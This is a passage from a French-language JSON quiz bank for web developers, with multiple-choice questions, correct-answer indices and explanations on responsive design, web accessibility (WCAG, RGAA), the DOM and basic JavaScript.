                "Les deux systèmes sont identiques mais utilisent des syntaxes différentes"
            ],
            "correct": 0,
            "explanation": "Flexbox se concentre sur l’alignement et la répartition des éléments sur un axe unique (horizontal ou vertical).\nCSS Grid, en revanche, permet une organisation sur deux axes, parfaite pour des mises en page complexes avec plusieurs zones."
        },
        {
            "theme": "Le responsive design",
            "question": "Quel est l’avantage principal d’utiliser les 'container queries' par rapport aux 'media queries' classiques ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Elles permettent d’adapter le style d’un composant en fonction de la taille de son conteneur, plutôt que de la taille de la fenêtre du navigateur",
                "Elles remplacent entièrement les media queries dans tous les navigateurs modernes",
                "Elles servent uniquement à modifier la taille des images selon la bande passante",
                "Elles sont utilisées pour rendre le site compatible avec les anciens navigateurs"
            ],
            "correct": 0,
            "explanation": "Les container queries ajustent le style d’un élément selon la taille de son conteneur parent, contrairement aux media queries qui se basent sur la taille du viewport.\nCela rend les composants plus modulaires et réutilisables."
        },
        {
            "theme": "Le responsive design",
            "question": "Quelle technique CSS permet de charger une image différente selon la résolution de l’écran ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "L’attribut 'srcset' dans la balise <img> combiné avec 'sizes'",
                "La propriété 'background-repeat'",
                "Le sélecteur ':responsive' dans le CSS",
                "L’attribut 'media' directement sur la balise <div>"
            ],
            "correct": 0,
            "explanation": "L’attribut 'srcset' permet de spécifier plusieurs sources d’images pour une même balise <img>. Combiné avec 'sizes', il indique au navigateur quelle version charger selon la résolution ou la densité de pixels de l’écran."
        },
        {
            "theme": "Le responsive design",
            "question": "Quelle approche est la plus efficace pour gérer un design responsive complexe dans une grande application web ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Adopter une architecture en composants modulaires et réutilisables avec des styles encapsulés",
                "Créer une feuille CSS géante avec toutes les media queries possibles",
                "Utiliser uniquement JavaScript pour ajuster les tailles et positions",
                "Empêcher les utilisateurs de redimensionner leur fenêtre"
            ],
            "correct": 0,
            "explanation": "Dans les grandes applications, l’approche modulaire (par composants) permet d’assurer la maintenabilité, la réutilisation et la cohérence des styles.\nChaque composant peut gérer sa propre adaptation responsive via des media ou container queries locales."
        },
        {
            "theme": "Le responsive design",
            "question": "Quels outils peuvent être utilisés pour tester l’affichage responsive d’un site web ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Les outils de développement intégrés aux navigateurs (DevTools), BrowserStack, Responsinator",
                "Uniquement Google Analytics",
                "Les frameworks CSS comme Bootstrap",
                "Les scripts PHP côté serveur"
            ],
            "correct": 0,
            "explanation": "Les DevTools de Chrome, Firefox ou Safari permettent de simuler différents appareils et tailles d’écran.\nBrowserStack et Responsinator offrent des tests sur de vrais appareils et résolutions."
        },
        {
            "theme": "Le responsive design",
            "question": "Qu'est-ce qu'une media query et à quoi sert-elle ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Une requête envoyée au serveur pour détecter le modèle de téléphone de l'utilisateur",
                "Une règle CSS qui permet d'appliquer des styles selon les caractéristiques de l'appareil : largeur d'écran, orientation, résolution...",
                "Un langage de requête de base de données utilisé par les sites responsives",
                "Une API du navigateur qui redimensionne automatiquement les images"
            ],
            "correct": 1,
            "explanation": "Une media query est une règle CSS qui conditionne l'application de styles selon des caractéristiques du média d'affichage.\nSyntaxe :\n@media (max-width: 768px) {\n    .menu { flex-direction: column; }\n}\nElle s'appuie sur des breakpoints (768px pour tablette, etc.).\nEn approche 'mobile first', on écrit les styles mobiles puis on utilise min-width pour enrichir sur les écrans plus larges.\nOn peut cibler la largeur (width), l'orientation (portrait/paysage) ou la résolution (écrans haute densité)."
        }
    ],
    "L'accessibilité": [
        {
            "theme": "L'accessibilité",
            "question": "Qu'est-ce que l'accessibilité numérique ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "L'accessibilité numérique désigne le fait de rendre les contenus et les services en ligne utilisables par tous, y compris les personnes en situation de handicap",
                "L'accessibilité numérique consiste à sécuriser les sites web contre les cyberattaques",
                "L'accessibilité numérique vise à rendre les contenus disponibles uniquement hors ligne",
                "L'accessibilité numérique concerne uniquement la compatibilité des navigateurs modernes"
            ],
            "correct": 0,
            "explanation": "L'accessibilité numérique désigne le fait de rendre les contenus et les services en ligne utilisables par tous, y compris les personnes en situation de handicap. On pense alors aux sites web, aux applications, aux documents et aux médias numériques."
        },
        {
            "theme": "L'accessibilité",
            "question": "Pourquoi l'accessibilité est-elle importante ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Parce qu’elle améliore uniquement le référencement naturel (SEO) d’un site web",
                "Parce qu’elle permet de réduire la taille des fichiers multimédias",
                "L'accessibilité est importante pour plusieurs raisons fondamentales",
                "Parce qu’elle simplifie la maintenance du code source du site"
            ],
            "correct": 2,
            "explanation": "L'accessibilité est importante pour plusieurs raisons fondamentales.\n\t- L' inclusion numérique , car elle permet aux personnes en situation de handicap d'accéder à l'information et aux services en ligne.\n\t- L' Égalité des droits , car elle garantit que chacun puisse participer pleinement à la société numérique, sans discrimination.\n\t- La Responsabilité sociale , car elle démontre l'engagement d'une organisation envers l'inclusion et la diversité.\n\t- La Conformité légale , car dans de nombreux pays, l'accessibilité est une obligation légale pour les sites web publics et certains sites privés.\n\t- L' Amélioration de l'expérience utilisateur , car les pratiques d'accessibilité bénéficient à tous les utilisateurs en rendant le contenu plus facile à lire et à naviguer.\n\t- L' Adaptabilité , car elle facilite l'accès au contenu sur divers appareils et dans différents contextes d'utilisation.\n\t- L' Avantage commercial , car elle permet d'atteindre un public plus large, améliorant potentiellement la visibilité et les revenus"
        },
        {
            "theme": "L'accessibilité",
            "question": "Quels sont les principaux standards et référentiels d'accessibilité ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Les directives CSS3 qui définissent les couleurs contrastées à utiliser sur le web",
                "Le protocole HTTPS qui sécurise la navigation des utilisateurs",
                "Les WCAG (Web Content Accessibility Guidelines) sont des directives internationales qui fournissent des recommandations pour rendre le contenu web plus accessible",
                "Le W3C HTML5 Framework pour le design réactif"
            ],
            "correct": 2,
            "explanation": "Les WCAG (Web Content Accessibility Guidelines) sont des directives internationales qui fournissent des recommandations pour rendre le contenu web plus accessible.\n\nLe RGAA (Référentiel Général d'Amélioration de l'Accessibilité) est un cadre français qui s'inspire des WCAG et établit des critères spécifiques pour l'accessibilité des sites publics."
        },
        {
            "theme": "L'accessibilité",
            "question": "Comment intégrer l'accessibilité dès la phase de conception d'un site web ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Pour intégrer l'accessibilité dès la phase de conception, il est essentiel de suivre une approche centrée sur l'utilisateur et de considérer les besoins des utilisateurs en situation de handicap",
                "En ajoutant des plug-ins d’accessibilité uniquement après la mise en ligne",
                "En limitant les tests utilisateurs à des personnes sans handicap",
                "En réduisant le nombre d’images et d’icônes pour alléger le site"
            ],
            "correct": 0,
            "explanation": "Pour intégrer l'accessibilité dès la phase de conception, il est essentiel de suivre une approche centrée sur l'utilisateur et de considérer les besoins des utilisateurs en situation de handicap.\n\nCela passe par la création de maquettes accessibles, l'utilisation de balises sémantiques et la planification de tests d'accessibilité tout au long du processus de développement"
        },
        {
            "theme": "L'accessibilité",
            "question": "Quelles sont les erreurs courantes à éviter ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Utiliser exclusivement des animations et vidéos pour présenter les contenus",
                "Se baser uniquement sur les tests automatisés sans vérification humaine",
                "Créer des pages sans structure HTML claire ni balises sémantiques",
                "Les erreurs suivantes sont à éviter :\n\t- l'utilisation de couleurs à faible contraste,\n\t- l'absence de textes alternatifs pour les images,\n\t- les formulaires non accessibles,\n\t- les éléments cliquables non accessibles au clavier,\n\t- le manque de balises sémantiques appropriées"
            ],
            "correct": 3,
            "explanation": "Les erreurs suivantes sont à éviter :\n\t- l'utilisation de couleurs à faible contraste,\n\t- l'absence de textes alternatifs pour les images,\n\t- les formulaires non accessibles,\n\t- les éléments cliquables non accessibles au clavier,\n\t- le manque de balises sémantiques appropriées"
        },
        {
            "theme": "L'accessibilité",
            "question": "Comment les technologies d'assistance interagissent-elles avec le contenu web ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Les technologies d'assistance, comme les lecteurs d'écran, interprètent le contenu HTML et le convertissent en audio ou en braille pour les utilisateurs",
                "Elles utilisent des scripts JavaScript pour modifier automatiquement le design du site",
                "Elles enregistrent la navigation de l'utilisateur pour améliorer les performances du site",
                "Elles remplacent les images par des vidéos pour rendre le contenu plus attractif"
            ],
            "correct": 0,
            "explanation": "Les technologies d'assistance , comme les lecteurs d'écran , interprètent le contenu HTML et le convertissent en audio ou en braille pour les utilisateurs.\n\nElles dépendent de balises sémantiques appropriées et d' attributs ARIA pour fournir une navigation et une compréhension efficaces du contenu.\n\nVoici quelques exemples :\n\n&lt;header>, &lt;nav>, &lt;main>, &lt;article>, &lt;section>, &lt;footer>, &lt;img alt=\"description\">, et les attributs ARIA comme role, aria-label, et aria-hidden."
        },
        {
            "theme": "L'accessibilité",
            "question": "Quelles pratiques de design peuvent améliorer l'accessibilité d'un site web ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Les pratiques de design qui améliorent l'accessibilité comprennent :\n\t- l'utilisation de polices lisibles (sans-serif),\n\t- le choix de couleurs avec un bon contraste,\n\t- la création de mises en page flexibles,\n\t- l'utilisation de balises sémantiques,\n\t- la structuration logique du contenu",
                "Utiliser des polices stylisées et des animations sur tous les textes pour capter l’attention",
                "Supprimer les légendes et descriptions pour simplifier la mise en page",
                "Employer uniquement des couleurs vives et saturées pour attirer l'œil"
            ],
            "correct": 0,
            "explanation": "Les pratiques de design qui améliorent l'accessibilité comprennent :\n\t- l'utilisation de polices lisibles (sans-serif),\n\t- le choix de couleurs avec un bon contraste,\n\t- la création de mises en page flexibles,\n\t- l'utilisation de balises sémantiques,\n\t- la structuration logique du contenu."
        },
        {
            "theme": "L'accessibilité",
            "question": "Comment tester l'accessibilité d'un site web ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "En demandant uniquement à l’équipe de développement de vérifier visuellement le site",
                "En désactivant les fichiers CSS pour voir si le texte s’affiche correctement",
                "En vérifiant si le site se charge rapidement sur les appareils mobiles",
                "Pour tester l'accessibilité d'un site web, vous pouvez utiliser des outils d'évaluation automatisés comme WAVE, ou le Lighthouse du navigateur Chrome"
            ],
            "correct": 3,
            "explanation": "Pour tester l'accessibilité d'un site web, vous pouvez utiliser des outils d'évaluation automatisés comme WAVE , ou le Lighthouse du navigateur Chrome.\nDes tests manuels avec des technologies d'assistance peuvent être réalisés.\nIl est également recommandé d'impliquer des utilisateurs en situation de handicap dans le processus de test."
        },
        {
            "theme": "L'accessibilité",
            "question": "Quelles sont les obligations légales pour les entreprises ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Se conformer uniquement aux normes de cybersécurité en vigueur",
                "Les entreprises doivent respecter des lois sur l'accessibilité, telles que le RGAA en France ou l'ADA aux États-Unis",
                "Publier chaque année un rapport interne sur l’activité numérique",
                "Garantir la compatibilité avec les anciens navigateurs sans exception"
            ],
            "correct": 1,
            "explanation": "Les entreprises doivent respecter des lois sur l'accessibilité, telles que le RGAA en France ou l' ADA aux États-Unis.\nLes obligations comprennent :\n\t- Assurer l'accessibilité des sites web pour les personnes en situation de handicap,\n\t- Suivre les normes d'accessibilité définies par le RGAA ou l'ADA,\n\t- Fournir des contenus alternatifs pour les médias non textuels,\n\t- Rendre les formulaires et éléments interactifs accessibles au clavier,\n\t- Effectuer des tests d'accessibilité réguliers pour garantir la conformité."
        },
        {
            "theme": "Accessibilité",
            "question": "Qu'est-ce que l'accessibilité numérique ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "La capacité d'un site à être bien référencé par les moteurs de recherche",
                "La pratique consistant à rendre les contenus et services numériques utilisables par toutes les personnes, y compris celles en situation de handicap",
                "L'optimisation du code pour qu'il se charge plus vite",
                "L'utilisation d'une charte graphique unique sur tout le site"
            ],
            "correct": 1,
            "explanation": "L'accessibilité numérique consiste à rendre les contenus et services numériques utilisables par toutes les personnes, quelles que soient leurs capacités.\nCela inclut les personnes avec des handicaps visuels, auditifs, moteurs ou cognitifs.\nL'objectif est de permettre à chacun d'accéder à l'information et d'interagir avec le contenu de manière équitable."
        },
        {
            "theme": "Accessibilité",
            "question": "Quel est l'objectif principal du RGAA (Référentiel Général d'Amélioration de l'Accessibilité) ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Garantir la conformité légale des sites publics en matière d'accessibilité",
                "Améliorer la vitesse de chargement des sites web",
                "Optimiser le référencement naturel (SEO) des sites web",
                "Uniformiser le design des sites web français"
            ],
            "correct": 0,
            "explanation": "Le RGAA est un référentiel français qui vise à garantir que les sites et services numériques publics soient accessibles à tous.\nIl s'appuie sur les WCAG (Web Content Accessibility Guidelines) et définit des critères précis pour assurer une accessibilité conforme à la loi française."
        },
        {
            "theme": "Accessibilité",
            "question": "Quel attribut HTML permet d’associer une étiquette à un champ de formulaire ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "L’attribut ‘alt’",
                "L’attribut ‘id’",
                "L’attribut ‘for’ dans la balise <label>",
                "L’attribut ‘aria-label’ sur le champ"
            ],
            "correct": 2,
            "explanation": "L’attribut ‘for’ de la balise <label> permet d’associer une étiquette à un champ de formulaire via l’identifiant du champ (attribut ‘id’).\nCette association aide les technologies d’assistance, comme les lecteurs d’écran, à annoncer le bon libellé lorsque l’utilisateur interagit avec le champ."
        },
        {
            "theme": "L'accessibilité",
            "question": "Comment peut-on s'assurer que notre application respecte les règles d'accessibilité numérique ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En s'assurant que le site est uniquement compatible avec les navigateurs mobiles.",
                "En appliquant des règles d'accessibilité (contrastes de couleur, textes alternatifs alt, erreurs explicites en texte, légendes, aria-label) et en testant via Lighthouse (DevTools), le RGAA/RCAA ou des tests utilisateurs réels.",
                "En utilisant exclusivement des polices serif et en désactivant le grossissement de la page par l'utilisateur.",
                "En masquant tous les éléments textuels pour les remplacer par des fichiers audio pré-enregistrés."
            ],
            "correct": 1,
            "explanation": "L'accessibilité (a11y) passe par de bons contrastes de couleurs, des alternatives textuelles (alt) pour les images, des structures sémantiques, et l'usage correct d'aria-label. Pour valider, on utilise le référentiel RGAA/RCAA, des outils automatisés comme Lighthouse dans les DevTools, et idéalement des tests d'usage par des personnes en situation de handicap."
        },
        {
            "theme": "L'accessibilité",
            "question": "Comment rendre une page web accessible ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "En utilisant uniquement des couleurs contrastées et en supprimant les animations",
                "En doublant chaque texte affiché par une version audio",
                "En agrandissant toute la police du site au maximum",
                "En utilisant un HTML sémantique, des contrastes de couleurs suffisants, des alternatives textuelles (alt), une navigation possible au clavier, des libellés sur les champs de formulaire et des tailles de cibles de clic adaptées"
            ],
            "correct": 3,
            "explanation": "Une page accessible peut être utilisée par tous, y compris les personnes en situation de handicap.\nLes bonnes pratiques principales sont :\n- un HTML sémantique (titres, balises nav/main/footer) pour la navigation au lecteur d'écran ;\n- un contraste texte/fond suffisant (ratio 4.5:1 recommandé par les WCAG) ;\n- des attributs alt sur les images et des <label> associés aux champs de formulaire ;\n- une navigation clavier complète avec un focus visible ;\n- des tailles de zone cliquables suffisantes et des messages d'erreur explicites.\nLes référentiels de référence sont les WCAG et, en France, le RGAA.\nOn teste avec un lecteur d'écran (NVDA, VoiceOver) et des outils d'audit (Wave, axe, Lighthouse)."
        }
    ],
    "Le DOM": [
        {
            "theme": "Le DOM",
            "question": "Que signifie DOM ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un protocole de communication entre les serveurs et le navigateur web",
                "Une base de données utilisée pour stocker les éléments HTML d’une page web",
                "Le terme DOM se décompose comme suit : - D : Document - Cela fait référence à tout type de document structuré, tel qu'un fichier HTML ou XML , qui peut être manipulé par un programme",
                "Un langage de balisage alternatif à HTML utilisé pour structurer les données"
            ],
            "correct": 2,
            "explanation": "Le terme DOM se décompose comme suit :\n\t- D : Document - Cela fait référence à tout type de document structuré, tel qu'un fichier HTML ou XML , qui peut être manipulé par un programme.\n\t- O : Object - Dans le contexte du DOM, un objet représente une partie du document, comme un tableau, une image, ou un lien. Chaque élément du document est traité comme un objet dans une structure arborescente.\n\t- M  : Model - Cela désigne la représentation abstraite de la structure du document. Le modèle permet aux développeurs d'interagir avec le document de manière standardisée, en utilisant des méthodes et des propriétés définies.\nLe Document Object Model (DOM) est donc une interface de programmation normalisée par le W3C , permettant d'interagir avec des documents HTML et XML .\nIl représente la structure arborescente d'un document, où chaque élément du document est un nœud.\nGrâce au DOM, il est possible de modifier dynamiquement, le contenu et la structure d'une page web à l'aide de langages de programmation comme JavaScript."
        },
        {
            "theme": "Le DOM",
            "question": "Comment le DOM représente-t-il la structure d'un document HTML ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Sous forme d’un fichier texte contenant les balises et leur contenu",
                "Sous forme de liste ordonnée d’éléments hiérarchisés dans le code source",
                "Chaque élément HTML, tel qu'une div, un paragraphe ou une image, est représenté comme un nœud",
                "Sous forme d’un tableau indexé où chaque ligne correspond à un élément HTML"
            ],
            "correct": 2,
            "explanation": "Chaque élément HTML, tel qu'une div, un paragraphe ou une image, est représenté comme un nœud.\nChacun de ces nœuds peut avoir des nœuds enfants, créant ainsi une structure en arbre.\nLe Document Object Model (DOM) représente ainsi la structure d'un document HTML sous la forme d'une arborescence d'objets.\nDocument\n ├─ html\n │ ├─ head\n │ │ └─ title\n │ │ └─ 'Mon Titre'\n │ └─ body\n │ ├─ div\n │ │ └─ 'Contenu'\n │ │ └─ img src='image.jpg'\n │ └─ p\n │ └─ 'Texte de paragraphe"
        },
        {
            "theme": "Le DOM",
            "question": "Qu'est-ce qu'un nœud dans le contexte du DOM ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un identifiant unique attribué à chaque élément HTML d’une page",
                "Une balise spéciale utilisée pour relier des fichiers JavaScript externes",
                "Une variable JavaScript utilisée pour stocker les éléments d’une page web",
                "Dans le DOM , les documents sont représentés par une structure arborescente composée de nœuds , qui sont reliés entre eux de manière hiérarchique"
            ],
            "correct": 3,
            "explanation": "Dans le DOM , les documents sont représentés par une structure arborescente composée de nœuds , qui sont reliés entre eux de manière hiérarchique.\nChaque nœud peut avoir 0, 1 ou plusieurs nœuds enfants dépendants.\nLes nœuds situés au même niveau et dépendant du même nœud parent sont appelés nœuds frères.\n\nVoici différents types de nœuds dans le DOM.\n\t- Le nœud <b>Document</b> est le nœud racine de l'arbre DOM, représentant l'ensemble du document.\n\t- Le nœud <b>Élément</b> représente une balise HTML, comme <div> ou <p>.\n\t- Le nœud <b>Attribut</b> représente un attribut d'un élément, comme id ou class.\n\t- Le nœud <b>Texte</b> représente le texte à l'intérieur d'un élément.\n\t- Le nœud <b>Commentaire</b> représente un commentaire dans le code HTML."
        },
        {
            "theme": "Le DOM",
            "question": "Qu'est-ce qu'un élément dans le DOM ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Dans le DOM, chaque balise HTML forme un élément, qui est un type de nœud",
                "Un type de fonction JavaScript utilisée pour modifier le contenu d’un document",
                "Une variable contenant les attributs CSS d’un élément HTML",
                "Une structure conditionnelle utilisée pour parcourir l’arborescence du document"
            ],
            "correct": 0,
            "explanation": "Dans le DOM, chaque balise HTML forme un élément, qui est un type de nœud.\nLes éléments sont les seuls nœuds pouvant contenir des attributs et à partir desquels d'autres nœuds peuvent dériver."
        },
        {
            "theme": "Le DOM",
            "question": "Quelles sont les principales méthodes pour accéder au DOM ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Les méthodes setTimeout() et setInterval()",
                "Les propriétés document.URL et document.title",
                "Les principales méthodes pour accéder aux éléments du DOM sont les suivantes : - getElementById() - getElementsByClassName() - getElementsByTagName() - querySelector()",
                "Les fonctions fetch() et queryDatabase()"
            ],
            "correct": 2,
            "explanation": "Les principales méthodes pour accéder aux éléments du DOM sont les suivantes :\n\t- getElementById()\n\t- getElementsByClassName()\n\t- getElementsByTagName()\n\t- querySelector()"
        },
        {
            "theme": "Le DOM",
            "question": "Comment modifier le contenu d'un élément ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "En réécrivant entièrement le code HTML de la page",
                "Pour modifier le contenu d'un élément dans le DOM, vous pouvez utiliser des propriétés comme innerHTML ou textContent , ou des méthodes comme appendChild() et removeChild()",
                "En utilisant uniquement des styles CSS dynamiques",
                "En modifiant directement le code source du navigateur"
            ],
            "correct": 1,
            "explanation": "Pour modifier le contenu d'un élément dans le DOM, vous pouvez utiliser des propriétés comme innerHTML ou textContent , ou des méthodes comme appendChild() et removeChild()."
        },
        {
            "theme": "Le DOM",
            "question": "Comment ajouter un nouvel élément ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En important un fichier HTML externe via une balise <import>",
                "En dupliquant un élément existant avec la méthode cloneElement()",
                "Pour ajouter un nouvel élément au DOM, vous pouvez utiliser la méthode createElement() pour créer l'élément, puis appendChild() ou insertBefore() pour l'insérer à l'endroit souhaité dans l'arbre",
                "En exécutant une commande SQL via le navigateur"
            ],
            "correct": 2,
            "explanation": "Pour ajouter un nouvel élément au DOM, vous pouvez utiliser la méthode createElement() pour créer l'élément, puis appendChild() ou insertBefore() pour l'insérer à l'endroit souhaité dans l'arbre."
        },
        {
            "theme": "Le DOM",
            "question": "Comment supprimer un élément ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Pour supprimer un élément du DOM, vous pouvez utiliser la méthode removeChild() sur le nœud parent de l'élément à supprimer",
                "En masquant l’élément avec CSS via display:none",
                "En supprimant manuellement la balise dans le code source HTML",
                "En réinitialisant la page avec location.reload()"
            ],
            "correct": 0,
            "explanation": "Pour supprimer un élément du DOM, vous pouvez utiliser la méthode removeChild() sur le nœud parent de l'élément à supprimer."
        },
        {
            "theme": "Le DOM",
            "question": "Qu'est-ce qu'un événement ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un élément du DOM réservé aux interactions CSS",
                "Un message envoyé du serveur au navigateur pour indiquer une mise à jour",
                "Un composant React permettant de gérer les états d’une page",
                "Les événements dans le DOM sont des scripts exécutés par le navigateur lorsque l'utilisateur interagit avec la page web, comme un clic de souris ou une saisie de clavier"
            ],
            "correct": 3,
            "explanation": "Les événements dans le DOM sont des scripts exécutés par le navigateur lorsque l'utilisateur interagit avec la page web, comme un clic de souris ou une saisie de clavier.\n\nVoici un exemple de code JavaScript pour gérer un événement de clic sur un bouton."
        },
        {
            "theme": "Le DOM",
            "question": "Comment ajouter un événement ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En insérant du code JavaScript directement dans le fichier CSS",
                "En ajoutant un attribut onEvent dans le fichier HTML principal",
                "En redéfinissant la fonction document.addEvent()",
                "Pour ajouter un événements dans le DOM, vous pouvez utiliser la méthode addEventListener()"
            ],
            "correct": 3,
            "explanation": "Pour ajouter un événements dans le DOM, vous pouvez utiliser la méthode addEventListener().\nCette méthode permet d'attacher une fonction à un élément, qui sera exécutée lorsque l'événement spécifié se produit.\n\nVoici un exemple de code :\nconst button = document.getElementById('myButton');\nbutton.addEventListener('click', function() {\n console.log('Bouton cliqué!');\n});"
        },
        {
            "theme": "Le DOM",
            "question": "Comment supprimer un événement ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En supprimant l'attribut onclick directement dans le HTML",
                "Pour supprimer un événements dans le DOM, vous pouvez utiliser la méthode removeEventListener()",
                "En vidant la console du navigateur",
                "En actualisant la page pour réinitialiser les scripts"
            ],
            "correct": 1,
            "explanation": "Pour supprimer un événements dans le DOM, vous pouvez utiliser la méthode removeEventListener().\nCette méthode retire un gestionnaire d'événements attaché à un élément.\n\nVoici un exemple de code :\nconst button = document.getElementById('myButton');\nfunction handleClick() {\n console.log('Bouton cliqué!');\n}\nbutton.addEventListener('click', handleClick);\n// Supprimer l'événement\nbutton.removeEventListener('click', handleClick);"
        },
        {
            "theme": "Le DOM",
            "question": "Quels sont les différents événements que l'on peut gérer ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Uniquement les événements liés aux formulaires HTML",
                "Tous les événements définis par le CSS et les animations",
                "L'évenement click est utilisé pour capter le clic d'une souris lorsque l'utilisateur clique sur un élément",
                "Les événements exclusivement associés aux serveurs API"
            ],
            "correct": 2,
            "explanation": "L'évenement click est utilisé pour capter le cliq d'une souris lorsque l'utilisateur clique sur un élément.\nIl existe des variantes avec mousedown, mouseup et dblclick\n\nconst button = document.getElementById('myButton');\nbutton.addEventListener('click', function() {\n console.log('Bouton cliqué!');\n}); \n\nL'événement mouseover est utilisé lorsque le curseur de la souris passe sur l'élément sélectionner.\nIl existe des variantes avec mouseenter, mouseleave, mouseout et mousemove\nconst box = document.getElementById('myBox');\nbox.addEventListener('mouseover', function() {\n console.log('Souris sur la boîte!');\n});\n\nL'événement load se produit lorsque la page est complètement chargée.\nwindow.addEventListener('load', function() {\n console.log('Page chargée!');\n});\n\nL'événement input se produit lorsque l'utilisateur tape dans un champ de texte.\nIl existe des variantes avec keydown et keyup.\nconst input = document.getElementById('myInput');\ninput.addEventListener('input', function() {\n console.log('Texte saisi :', this.value);\n}); \n\nL'événement change se produit lorsque la valeur d'un élément de formulaire change.\nconst select = document.getElementById('mySelect');\nselect.addEventListener('change', function() {\n console.log('Sélection changée :', this.value);\n});"
        },
        {
            "theme": "Le DOM",
            "question": "Qu'est-ce que la propagation d'événements ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le mécanisme par lequel un événement reste bloqué sur un seul élément du DOM",
                "La propagation d'événements dans le DOM fait référence au comportement par défaut des événements qui remonte dans l'arbre du DOM à partir de l'élément cible jusqu'à l'élément racine",
                "Une méthode utilisée pour dupliquer un événement sur plusieurs éléments HTML",
                "Le processus par lequel les événements sont convertis en requêtes serveur"
            ],
            "correct": 1,
            "explanation": "La propagation d'événements dans le DOM fait référence au comportement par défaut des événements qui remonte dans l'arbre du DOM à partir de l'élément cible jusqu'à l'élément racine.\nCe comportement peut être contrôlé avec des méthodes comme stopPropagation() ."
        },
        {
            "theme": "Le DOM",
            "question": "Comment manipuler les styles CSS d'un élément ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En modifiant directement le fichier style.css du projet",
                "En ajoutant des attributs HTML supplémentaires dans la balise concernée",
                "En utilisant uniquement des frameworks CSS externes comme Bootstrap",
                "Pour manipuler les styles CSS d'un élément via le DOM, vous pouvez accéder à la propriété style de l'élément et définir les propriétés CSS souhaitées, en écrivant les lignes de codes suivantes"
            ],
            "correct": 3,
            "explanation": "Pour manipuler les styles CSS d'un élément via le DOM, vous pouvez accéder à la propriété style de l'élément et définir les propriétés CSS souhaitées, en écrivant les lignes de codes suivantes.\nconst element = document.querySelector(\"div\");\nelement.style.color = 'red';"
        },
        {
            "theme": "Le DOM",
            "question": "Comment peut-on naviguer dans le DOM ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En utilisant les flèches du clavier dans le navigateur",
                "Pour naviguer dans le DOM (Document Object Model), plusieurs propriétés JavaScript peuvent être utilisées",
                "En consultant la structure du code source HTML du site",
                "En exécutant une fonction de débogage dans la console"
            ],
            "correct": 1,
            "explanation": "Pour naviguer dans le DOM (Document Object Model), plusieurs propriétés JavaScript peuvent être utilisées.\nCes propriétés permettent de se déplacer entre les nœuds du document et d'interagir avec la structure HTML de manière dynamique.\nParmi les propriétés les plus courantes, on trouve :\n\t- parentNode qui renvoie le nœud parent d'un nœud donné, permettant de remonter dans la hiérarchie du DOM;\n\t- childNodes qui renvoie une collection de tous les nœuds enfants d'un nœud donné, ce qui permet d'accéder à tous les éléments qui lui sont directement associés;\n\t firstChild et lastChild qui permettent d'accéder respectivement au premier et au dernier enfant d'un nœud, facilitant ainsi la navigation vers les extrémités d'une liste d'éléments;\n\t- nextSibling et previousSibling qui permettent de naviguer entre les nœuds frères, en accédant respectivement au nœud suivant ou précédent dans la même hiérarchie."
        },
        {
            "theme": "Le DOM",
            "question": "Qu'est-ce que le DOM virtuel et comment est-il utilisé dans des bibliothèques comme React ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Le DOM virtuel est une représentation en mémoire de l'arbre du DOM, utilisée par des bibliothèques comme React pour optimiser les mises à jour du DOM réel",
                "Une base de données temporaire qui stocke les états des composants d’une application web",
                "Un outil de navigation intégré à React pour afficher la structure des pages",
                "Une extension du DOM classique utilisée uniquement pour les serveurs Node.js"
            ],
            "correct": 0,
            "explanation": "Le DOM virtuel est une représentation en mémoire de l'arbre du DOM, utilisée par des bibliothèques comme React pour optimiser les mises à jour du DOM réel.\nLorsque l'état de l'application change, React calcule les différences entre le DOM virtuel et le DOM réel, puis applique uniquement les changements nécessaires au DOM réel, améliorant ainsi les performances."
        }
    ],
    "JS - JavaScript": [
        {
            "theme": "JS - JavaScript",
            "question": "Comment déclarer une variable constante en JavaScript ES6+ ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "var myVar",
                "let myVar",
                "const myVar",
                "constant myVar"
            ],
            "correct": 2,
            "explanation": "Le mot-clé 'const' permet de déclarer une variable constante qui ne peut pas être réassignée après sa déclaration initiale."
        },
        {
            "theme": "JS - JavaScript",
            "question": "Quelle méthode permet d'ajouter un élément à la fin d'un tableau ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "array.add()",
                "array.push()",
